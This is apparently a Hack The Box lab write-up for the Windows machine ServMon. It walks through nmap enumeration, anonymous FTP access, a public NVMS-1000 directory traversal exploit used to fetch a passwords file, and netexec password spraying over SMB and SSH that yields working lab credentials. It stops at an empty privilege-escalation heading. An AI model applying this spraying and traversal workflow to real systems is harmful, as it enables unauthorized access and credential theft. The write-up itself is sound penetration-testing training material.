- Machine Name : ServMon
- Link - https://app.hackthebox.com/machines/240
- OS: Windows
- Difficulty - Easy

### Initial Enumeration

```nmap -sCV -oN nmap.txt -Pn -v 10.10.10.184```
```bash
# Nmap 7.94SVN scan initiated Fri Sep 27 14:17:15 2024 as: nmap -sCV -oN nmap.txt -v -Pn 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.026s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  tcpwrapped
8443/tcp open  ssl/https-alt
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
|_SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Host script results:
| smb2-time: 
|   date: 2024-09-27T18:18:58
|_  start_date: N/A
|_clock-skew: 2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 27 14:19:03 2024 -- 1 IP address (1 host up) scanned in 107.30 seconds
```
So the first thing we see right away is the anonymous FTP  allowed, lets try to login into ftp using anonymous:anonymous

We find 2 files Confidential.txt and Notes to do.txt
The files mention the following-
```bash
┌──(captain㉿kali)-[~/Documents/HTB/servmon/ftp]
└─$ cat Confidential.txt                    
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                                                                                                            

┌──(captain㉿kali)-[~/Documents/HTB/servmon/ftp]
└─$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
We also have port 80 open, lets check the website

Website running NVMS 1000
![image](https://github.com/user-attachments/assets/bea8f1c6-24a8-4714-b783-4f567072a453)

Lets quickly google NVMS 1000 exploits to see if we have anything and boom we get a directory traversal exploit, now we can grab any interesting files from the machine
Exploit POC on E-DB - ![NVMS-1000 - Directory Traversal](https://www.exploit-db.com/exploits/47774) explains how we perform directory traversal.

### Foothold

From the above files we got that there is a passwords.txt file on Nathan's desktop, lets see if we can grab it
![image](https://github.com/user-attachments/assets/66bcc69b-3485-4e0f-9d6f-a4055db8f836)
And we have it, now we can spray these passwords using netexec

```bash
┌──(captain㉿kali)-[~/Documents/HTB/servmon]
└─$ nxc smb 10.10.10.184 -u nathan -p passwords.txt          
SMB         10.10.10.184    445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                            
┌──(captain㉿kali)-[~/Documents/HTB/servmon]
└─$ nxc smb 10.10.10.184 -u nadine -p passwords.txt 
SMB         10.10.10.184    445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk 
```

It doesnt look much when we try to enumerate shares accessible using the password but the box has port 22 open, spraying the passwords on ssh
```bash
┌──(captain㉿kali)-[~/Documents/HTB/servmon]
└─$ nxc smb 10.10.10.184 -u nadine -p L1k3B1gBut7s@W0rk --shares                                  
SMB         10.10.10.184    445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk 
SMB         10.10.10.184    445    SERVMON          [*] Enumerated shares
SMB         10.10.10.184    445    SERVMON          Share           Permissions     Remark
SMB         10.10.10.184    445    SERVMON          -----           -----------     ------
SMB         10.10.10.184    445    SERVMON          ADMIN$                          Remote Admin
SMB         10.10.10.184    445    SERVMON          C$                              Default share
SMB         10.10.10.184    445    SERVMON          IPC$            READ            Remote IPC
                                                                                                                                                                                                                                            
┌──(captain㉿kali)-[~/Documents/HTB/servmon]
└─$ nxc ssh 10.10.10.184 -u nadine -p L1k3B1gBut7s@W0rk         
SSH         10.10.10.184    22     10.10.10.184     [*] SSH-2.0-OpenSSH_for_Windows_8.0
SSH         10.10.10.184    22     10.10.10.184     [+] nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!
```

We can ssh into the box and grab the user.txt


### Privilege Escalation

